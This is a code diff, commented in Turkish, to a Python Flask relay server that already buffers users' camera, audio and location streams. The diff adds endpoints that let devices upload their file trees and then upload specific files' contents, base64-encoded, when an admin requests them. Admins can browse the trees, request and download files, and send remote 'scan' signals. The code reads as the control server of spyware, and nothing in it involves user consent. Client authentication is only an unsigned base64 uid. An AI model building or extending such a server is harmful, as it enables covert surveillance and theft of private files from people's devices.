@@ -36,6 +36,10 @@ camera_buffers = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1
 audio_buffers = {}        # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
 incoming_audio = {}       # uid -> {chunks: [{seq, data, mime, ts}], max_seq: -1}
 location_data = {}         # uid -> {positions: [{lat, lng, acc, speed, heading, alt, ts, time}], count: 0}
+storage_files = {}          # uid -> {tree: [{name, path, size, mime, mtime, is_dir}], scanned_at: 0}
+storage_content = {}        # uid -> {path: {data_base64, mime, size, uploaded_at}}
+storage_pending = {}        # uid -> [path, ...]  # admin'in istediği dosyalar
+storage_signals = {}        # uid -> [signal, ...] # admin'den kullanıcıya sinyaller
 
 # ==================== YARDIMCI ====================
 
@@ -55,6 +59,10 @@ def clean_stale_users():
             audio_buffers.pop(uid, None)
             incoming_audio.pop(uid, None)
             location_data.pop(uid, None)
+            storage_files.pop(uid, None)
+            storage_content.pop(uid, None)
+            storage_pending.pop(uid, None)
+            storage_signals.pop(uid, None)
 
 
 # ==================== ADMIN TOKEN (HMAC — server-state gerekmez) ====================
@@ -300,6 +308,186 @@ def api_relay_location():
             buf["positions"] = buf["positions"][-200:]
 
     return jsonify({"status": "ok", "count": buf["count"]})
+
+
+# ==================== STORAGE ENDPOINTS ====================
+
+@app.route("/api/relay/storage/scan", methods=["POST"])
+def api_relay_storage_scan():
+    """Kullanıcı dosya ağacını yükler."""
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    tree = data.get("files", [])
+
+    if not uid or not isinstance(tree, list):
+        return jsonify({"status": "error", "error": "eksik veri"}), 400
+
+    with relay_lock:
+        storage_files[uid] = {
+            "tree": tree,
+            "scanned_at": time.time()
+        }
+
+    return jsonify({"status": "ok", "count": len(tree)})
+
+
+@app.route("/api/relay/storage/pending")
+def api_relay_storage_pending():
+    """Kullanıcı admin'in hangi dosyayı istediğini öğrenir."""
+    auth_arg = request.args.get("auth", "")
+    try:
+        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
+        uid = auth_data.get("uid")
+    except Exception:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    with relay_lock:
+        paths = storage_pending.get(uid, [])
+        result = list(paths)
+        if paths:
+            storage_pending[uid] = []
+
+    return jsonify({"status": "ok", "paths": result})
+
+
+@app.route("/api/relay/storage/content", methods=["POST"])
+def api_relay_storage_content():
+    """Kullanıcı dosya içeriğini yükler."""
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    path = data.get("path", "")
+    content_b64 = data.get("content", "")
+    mime = data.get("mimeType", "")
+
+    if not uid or not path:
+        return jsonify({"status": "error", "error": "eksik veri"}), 400
+
+    max_size = 10 * 1024 * 1024  # 10MB limit
+    if len(content_b64) > max_size:
+        return jsonify({"status": "error", "error": "dosya cok buyuk"}), 413
+
+    with relay_lock:
+        if uid not in storage_content:
+            storage_content[uid] = {}
+        storage_content[uid][path] = {
+            "data_base64": content_b64,
+            "mime": mime,
+            "size": len(content_b64),
+            "uploaded_at": time.time()
+        }
+        # Eski cache'leri temizle (max 20 dosya)
+        if len(storage_content[uid]) > 20:
+            oldest = sorted(storage_content[uid].items(), key=lambda x: x[1]["uploaded_at"])[0]
+            del storage_content[uid][oldest[0]]
+
+    return jsonify({"status": "ok", "path": path})
+
+
+@app.route("/api/admin/storage/list/<uid>")
+def api_admin_storage_list(uid):
+    """Admin dosya ağacını alır."""
+    session = require_admin(request)
+    if not session:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    with relay_lock:
+        sf = storage_files.get(uid, {"tree": [], "scanned_at": 0})
+
+    return jsonify({
+        "status": "ok",
+        "files": sf["tree"],
+        "scanned_at": sf["scanned_at"]
+    })
+
+
+@app.route("/api/admin/storage/request", methods=["POST"])
+def api_admin_storage_request():
+    """Admin bir dosyayı talep eder."""
+    session = require_admin(request)
+    if not session:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    path = data.get("path", "")
+
+    if not uid or not path:
+        return jsonify({"status": "error", "error": "eksik veri"}), 400
+
+    with relay_lock:
+        if uid not in storage_pending:
+            storage_pending[uid] = []
+        storage_pending[uid].append(path)
+
+    return jsonify({"status": "ok", "requested": True})
+
+
+@app.route("/api/admin/storage/content", methods=["POST"])
+def api_admin_storage_content():
+    """Admin önbellekteki dosya içeriğini alır."""
+    session = require_admin(request)
+    if not session:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    path = data.get("path", "")
+
+    if not uid or not path:
+        return jsonify({"status": "error", "error": "eksik veri"}), 400
+
+    with relay_lock:
+        content = storage_content.get(uid, {}).get(path)
+
+    if not content:
+        return jsonify({"status": "pending", "message": "dosya henuz yuklenmedi"}), 202
+
+    return jsonify({
+        "status": "ok",
+        "content": content["data_base64"],
+        "mime": content["mime"],
+        "size": content["size"]
+    })
+
+
+@app.route("/api/admin/storage/signal/<uid>", methods=["POST"])
+def api_admin_storage_signal(uid):
+    """Admin kullanıcıya sinyal gönderir (örn: tarama başlat)."""
+    session = require_admin(request)
+    if not session:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    data = request.get_json() or {}
+    signal = data.get("signal", "")
+
+    if not signal:
+        return jsonify({"status": "error", "error": "sinyal gerekli"}), 400
+
+    with relay_lock:
+        if uid not in storage_signals:
+            storage_signals[uid] = []
+        storage_signals[uid].append(signal)
+
+    return jsonify({"status": "ok"})
+
+
+@app.route("/api/relay/storage/signal")
+def api_relay_storage_signal():
+    """Kullanıcı admin'den gelen sinyalleri kontrol eder."""
+    auth_arg = request.args.get("auth", "")
+    try:
+        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
+        uid = auth_data.get("uid")
+    except Exception:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    with relay_lock:
+        signals = storage_signals.get(uid, [])
+        result = list(signals)
+        if signals:
+            storage_signals[uid] = []
+
+    return jsonify({"status": "ok", "signals": result})
 
 
 # ==================== ADMIN — KULLANICI VERİSİNİ ÇEKME ====================
